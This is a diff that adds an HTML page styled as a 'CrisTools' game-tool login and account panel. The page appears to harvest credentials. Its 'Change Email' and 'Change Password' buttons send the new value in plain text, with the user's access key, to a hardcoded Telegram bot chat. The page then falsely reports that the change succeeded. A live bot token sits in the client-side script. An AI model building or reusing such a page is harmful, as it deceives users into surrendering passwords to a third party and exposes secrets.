@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CrisTools Login</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: url('https://i.ibb.co/0RzgPXpr/Photoroom-20250613-191110.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+    }
+    .container {
+      max-width: 420px;
+      margin: 60px auto;
+      padding: 25px;
+      backdrop-filter: blur(12px);
+      background: rgba(0,0,0,0.4);
+      border: 2px solid #00aaff;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #005a9c;
+    }
+    h2 {
+      text-align: center;
+      color: #00aaff;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+    }
+    input::placeholder { color: #ccc; }
+    button {
+      background: #007acc;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover { background: #005a9c; }
+    .box {
+      border: 2px solid #00aaff;
+      box-shadow: 0 0 15px #005a9c;
+      padding: 15px;
+      margin-top: 25px;
+      border-radius: 12px;
+    }
+    .menu-button {
+      margin-top: 15px;
+      background: #222;
+      border: 1px solid #00aaff;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 25%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #000000cc;
+      padding: 20px;
+      border-radius: 10px;
+      z-index: 1000;
+    }
+    .popup input {
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🎮 CrisTools Access</h2>
+    <input type="text" id="accessKey" placeholder="Enter Access Key" />
+    <button onclick="login()">🔓 Login</button>
+
+    <div id="resultBox" class="box" style="display:none;">
+      <h3>🧾 Account Info</h3>
+      <p id="balanceLine">💰 Balance: </p>
+      <p id="keyLine">🔑 Access Key: </p>
+      <button class="menu-button" onclick="showPopup('email')">📧 Change Email</button>
+      <button class="menu-button" onclick="showPopup('password')">🔒 Change Password</button>
+      <button class="menu-button" onclick="sendKing()">👑 King Rank</button>
+    </div>
+  </div>
+
+  <!-- Popups -->
+  <div id="popup-email" class="popup">
+    <input type="text" id="newEmail" placeholder="Enter New Email">
+    <button onclick="submitChange('email')">Change</button>
+  </div>
+  <div id="popup-password" class="popup">
+    <input type="text" id="newPassword" placeholder="Enter New Password">
+    <button onclick="submitChange('password')">Change</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8147408379:AAGT_caIIGN_n2FYgia4Le8LlVcs8ZVXYtg';
+    const ADMIN_ID = '8147408379'; // Replace with your real Telegram user ID
+
+    function login() {
+      const key = document.getElementById('accessKey').value.trim();
+      if (!key) return alert('Enter your Access Key');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+        .then(res => res.json())
+        .then(data => {
+          const messages = data.result.map(u => u.message).filter(Boolean);
+          const match = messages.find(msg => msg.text?.includes(key));
+
+          if (!match) return alert('❌ Invalid Access Key');
+
+          const balanceLine = match.text.match(/Balance:\s*(.+)/i);
+          const balance = balanceLine ? balanceLine[1] : 'Unknown';
+
+          document.getElementById('resultBox').style.display = 'block';
+          document.getElementById('balanceLine').innerText = `💰 Balance: ${balance}`;
+          document.getElementById('keyLine').innerText = `🔑 Access Key: ${key}`;
+        })
+        .catch(() => alert('⚠️ Error checking access key'));
+    }
+
+    function showPopup(type) {
+      document.getElementById(`popup-${type}`).style.display = 'block';
+    }
+
+    function submitChange(type) {
+      const key = document.getElementById('accessKey').value;
+      const value = document.getElementById(`new${capitalize(type)}`).value;
+      if (!value) return alert(`Enter your new ${type}`);
+
+      const message = type === 'email'
+        ? `📧 Email changed to: ${value}\n🔑 Key: ${key}`
+        : `🔒 Password changed to: ${value}\n🔑 Key: ${key}`;
+
+      sendToBot(message);
+      alert(`Your ${type} changed`);
+      document.getElementById(`popup-${type}`).style.display = 'none';
+    }
+
+    function sendKing() {
+      const key = document.getElementById('accessKey').value;
+      sendToBot(`👑 King Rank Activated\n🔑 Key: ${key}`);
+      alert('Successfully');
+    }
+
+    function sendToBot(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: ADMIN_ID, text: message})
+      });
+    }
+
+    function capitalize(str) {
+      return str.charAt(0).toUpperCase() + str.slice(1);
+    }
+  </script>
+</body>
+</html>
